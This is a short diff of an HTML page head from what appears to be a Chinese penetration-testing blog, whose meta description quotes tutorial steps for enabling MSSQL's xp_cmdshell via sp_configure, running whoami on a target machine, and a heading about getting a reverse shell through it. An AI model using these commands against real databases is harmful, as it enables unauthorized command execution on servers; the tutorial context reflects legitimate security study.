@@ -26,6 +26,7 @@ smbclient(选项)(参数)
 2、mssql开启xp_cmdshell
 EXEC sp_configure &amp;#39;Show Advanced Options&amp;#39;, 1;	\\使用sp_configure系统存储过程，设置服务器配置选项，将Show Advanced Options设置为1时，允许修改数据库的高级配置选项 reconfigure;	\\确认上面的操作 sp_configure;	\\查看当前sp_configure配置情况 EXEC sp_configure &amp;#39;xp_cmdshell&amp;#39;, 1	\\使用sp_configure系存储过程，启用xp_cmdshell参数，来允许SQL Server调用操作系统命令 reconfigure;	\\确认上面的操作 xp_cmdshell &amp;#34;whoami&amp;#34; \\在靶机上调用cmdshell执行whoami 3、使用mssql的xp_cmdshell反弹shell" /><meta name="keywords"
   content="F0rmat, 信息安全, 网络安全, 红蓝攻防, 渗透测试, bypass, waf, 注入, 黑客" />
+  <meta name="referrer" content="no-referrer" />
 
 
 <link rel="stylesheet" href="https://getshe11.com/css/main.css">
